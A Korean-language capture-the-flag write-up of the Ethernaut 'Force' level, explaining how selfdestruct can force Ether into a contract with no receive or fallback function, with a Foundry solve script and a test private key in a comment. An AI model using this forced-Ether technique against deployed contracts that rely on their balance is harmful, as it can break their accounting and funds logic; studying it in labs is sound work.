# 지문

어떤 컨트랙트는 단순히 당신의 돈을 받지 않을 수도 있습니다 ¯\\\_(ツ)\_/¯

이 레벨의 목표는 **컨트랙트의 잔액(balance)을 0보다 크게 만드는 것**입니다.

도움이 될 수 있는 것들:

* **폴백(fallback) 메서드**
* 어떤 경우에는 컨트랙트를 공격하는 가장 좋은 방법이 **또 다른 컨트랙트를 이용하는 것**일 수 있음
* 상단의 **"?" 페이지**에서 **"Beyond the console"** 섹션 참고


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

# 풀이 

`Force` contract안에 receive/fallback handler가 없어서 Native Token을 받을 수 없는것같지만 몇가지 트릭으로 Native Token을 전송할 수 있음.

가장 쉬운방법으로 알려진게 `selfdestruct`를 이용한 Native Token 전송임.

그외에 Consensus Layer에서 출금기능의 receiver를 저 contract로 지정한다던가 하는 trick도 쓸 수 있음.

Go-ethereum을 분석해봤을 때 `AddBalance`나 이런 node implementation level에서 balance를 더해주는건 contract 코드의 영향을 받지않기 때문에 가능한것임

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
}

contract Giver {

    constructor() public payable {}
    function trigger(address target) public {
        selfdestruct(payable(target));
    }

    receive() external payable {}
}
contract SolveScript is Script {
    address public target = 0x56639dB16Ac50A89228026e42a316B30179A5376;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("target balance : %d", target.balance);
        Giver giver = new Giver{value:100}();
        giver.trigger(target);

        console.log("target balance after poc : %d", target.balance);
        vm.stopBroadcast();
    }
}
```